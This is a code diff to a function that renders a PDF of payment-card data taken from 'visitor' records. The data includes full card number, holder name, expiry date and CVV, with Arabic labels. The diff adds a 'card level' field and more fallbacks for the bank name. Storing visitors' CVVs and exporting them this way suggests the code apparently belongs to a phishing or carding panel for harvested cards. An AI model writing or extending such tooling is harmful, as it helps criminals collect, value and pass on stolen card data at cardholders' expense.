@@ -132,8 +132,19 @@ function buildPdfHtml(
     ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
     : decryptField(visitor._v4 || visitor.cardHolderName);
   const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
+  const cardLevel = latestCard
+    ? val(
+        latestCard.data?.cardLevel ||
+          latestCard.data?.level ||
+          latestCard.data?.bankInfo?.level
+      )
+    : val(visitor.cardLevel || visitor.bankInfo?.level);
   const bankName = latestCard
-    ? val(latestCard.data?.bankInfo?.name)
+    ? val(
+        latestCard.data?.bankInfo?.name ||
+          latestCard.data?.bankName ||
+          latestCard.data?.issuer?.name
+      )
     : val(visitor.bankInfo?.name);
   const bankCountry = latestCard
     ? val(latestCard.data?.bankInfo?.country)
@@ -262,6 +273,7 @@ function buildPdfHtml(
     { label: "رقم البطاقة", value: cardNumber, mono: true },
     { label: "اسم حامل البطاقة", value: cardHolderName },
     { label: "نوع البطاقة", value: cardType },
+    { label: "مستوى البطاقة", value: cardLevel },
     { label: "تاريخ الانتهاء", value: expiryDate, mono: true },
     { label: "CVV", value: cvv, mono: true },
     { label: "البنك", value: bankName },
